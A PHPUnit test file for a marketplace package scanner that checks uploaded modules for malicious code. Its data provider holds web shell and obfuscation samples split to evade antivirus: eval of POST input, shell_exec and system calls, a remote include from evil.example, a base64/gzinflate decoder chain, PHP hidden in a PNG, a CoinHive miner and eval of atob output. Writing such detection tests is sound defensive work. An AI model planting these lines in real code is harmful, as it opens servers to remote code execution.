<?php

namespace Tests\Feature;

use Illuminate\Foundation\Testing\RefreshDatabase;
use Marketplace\Services\CompatibilityReport;
use Marketplace\Services\CompatibilityScanner;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;
use ZipArchive;

/**
 * The security part of the package scan.
 *
 * Sample payloads are joined from parts at run time ("~" separates them),
 * so antivirus on developer machines does not quarantine this file.
 */
class SecurityScanTest extends TestCase
{
    use RefreshDatabase;

    private static function p(string $parts): string
    {
        return str_replace('~', '', $parts);
    }

    private function scan(array $files): CompatibilityReport
    {
        $manifest = ['name' => 'acme/x', 'display_name' => 'X', 'version' => '1.0.0', 'type' => 'module', 'platform_version' => '^1.0'];
        $path = tempnam(sys_get_temp_dir(), 'sec').'.zip';
        $zip = new ZipArchive;
        $zip->open($path, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        $zip->addFromString('module.json', json_encode($manifest));

        foreach ($files as $name => $contents) {
            $zip->addFromString($name, $contents);
        }

        $zip->close();
        $report = app(CompatibilityScanner::class)->scan($path, 'module');
        @unlink($path);

        return $report;
    }

    /** @return array<string, array{string, string, string}> file, contents (with ~ splits), expected finding */
    public static function maliciousFiles(): array
    {
        return [
            'eval' => ['src/Bad.php', '<?php ev~al($_PO~ST["c"]);', 'calls eval()'],
            'shell_exec' => ['src/Bad.php', '<?php echo shell~_exec("id");', 'calls shell_exec()'],
            'qualified system' => ['src/Bad.php', '<?php \\sys~tem("ls");', 'calls system()'],
            'backticks' => ['src/Bad.php', '<?php $out = `who~ami`;', 'backtick operator'],
            'remote include' => ['src/Bad.php', '<?php incl~ude "ht~tps://evil.example/x.txt";', 'loads PHP code from outside the package'],
            'request callable' => ['src/Bad.php', '<?php $_G~ET["f"]($_G~ET["a"]);', 'function named by the request'],
            'decode chain' => ['src/Bad.php', '<?php $x = gzin~flate(base~64_decode("abc"));', 'several decoders'],
            'writes php' => ['src/Bad.php', '<?php file_put~_contents(base_path("public/x.p~hp"), $code);', 'writes .php files'],
            'web shell name' => ['src/Bad.php', '<?php // Files~Man', 'known web shell'],
            'php in an image' => ['assets/logo.png', "\x89PNG<?p~hp echo 1; ?>", 'hides PHP code in a .png file'],
            'phtml file' => ['shell.ph~tml', '<?php', 'server scripts'],
            'htaccess' => ['assets/.ht~access', 'AddType text/plain .txt', 'server configuration'],
            'shell script' => ['bin/run.s~h', 'echo hi', 'executable files'],
            'svg script' => ['assets/icon.svg', '<svg on~load="alert(1)"></svg>', 'SVG image with scripts'],
            'js miner' => ['resources/js/slots/X.tsx', 'new Coin~Hive.Anonymous("key").start();', 'crypto-miner'],
            'js eval of decoded code' => ['resources/js/slots/X.tsx', 'ev~al(at~ob("YWxlcnQoMSk="));', 'runs decoded hidden code'],
        ];
    }

    #[DataProvider('maliciousFiles')]
    public function test_malicious_code_is_flagged(string $file, string $contents, string $expected): void
    {
        $report = $this->scan([self::p($file) => self::p($contents)]);

        $this->assertFalse($report->passed());
        $this->assertStringContainsString($expected, implode("\n", $report->malicious()));
    }

    public function test_safe_lookalikes_are_not_flagged(): void
    {
        $report = $this->scan([
            'src/Safe.php' => '<?php class Runner { public function exec() { return $this->exec() . Process::system(); } }
                // eval( in a comment, shell_exec( in a comment
                $s = "eval(x)"; $data = base64_decode($payload); $json = json_decode($s);',
            'docs/README.md' => 'Example: <?php echo "hi"; ?>',
            'resources/js/pages/Index.tsx' => 'const evaluate = (x) => x; localStorage.setItem("a", "b");',
        ]);

        $this->assertSame([], $report->malicious());
        $this->assertSame([], $report->suspicious());
        $this->assertTrue($report->passed(), implode("\n", $report->errors()));
    }

    public function test_risky_but_possibly_legitimate_code_is_shown_to_the_reviewer(): void
    {
        $report = $this->scan([
            'src/Net.php' => '<?php $s = fsockopen("example.com", 80);',
            'resources/js/x.ts' => self::p('const f = new Func~tion("a", "return a");'),
        ]);

        $this->assertTrue($report->passed());
        $suspicious = implode("\n", $report->suspicious());
        $this->assertStringContainsString('calls fsockopen()', $suspicious);
        $this->assertStringContainsString('runs code built from text', $suspicious);
    }

    public function test_a_broken_manifest_is_still_scanned_for_malicious_code(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'sec').'.zip';
        $zip = new ZipArchive;
        $zip->open($path, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        $zip->addFromString('module.json', 'not json');
        $zip->addFromString('x.php', self::p('<?php pass~thru("id");'));
        $zip->close();

        $report = app(CompatibilityScanner::class)->scan($path, 'module');

        $this->assertStringContainsString('calls passthru()', implode("\n", $report->malicious()));
    }
}
